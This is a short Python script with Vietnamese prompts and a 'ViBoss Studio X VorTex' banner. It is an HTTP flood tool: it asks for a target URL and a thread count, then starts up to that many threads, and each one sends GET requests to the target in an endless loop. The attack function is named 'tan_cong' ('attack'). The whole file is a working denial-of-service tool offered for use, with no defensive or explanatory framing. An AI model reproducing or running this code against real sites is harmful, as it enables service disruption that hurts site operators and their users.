import threading
import requests

print("""
ViBoss Studio  X   VorTex
http://github.com/dhungx/ 
""")

def tan_cong(target):
    try:
        while True:
            res = requests.get(target)
            print("Đã gửi yêu cầu!")
    except requests.exceptions.ConnectionError:
        print("[!!!] Lỗi kết nối!")

so_luong_luon = 50
url = input("Nhập URL: ")

try:
    so_luong_luon = int(input("Số lượng luồng: "))
except ValueError:
    exit("Số lượng luồng không hợp lệ!")

if so_luong_luon == 0:
    exit("Số lượng luồng không hợp lệ!")

if not url.__contains__("http"):
    exit("URL không chứa http hoặc https!")

if not url.__contains__("."):
    exit("Tên miền không hợp lệ!")

for i in range(0, so_luong_luon):
    luong = threading.Thread(target=tan_cong, args=(url,))
    luong.start()
    print(str(i + 1) + " luồng đã được khởi động!")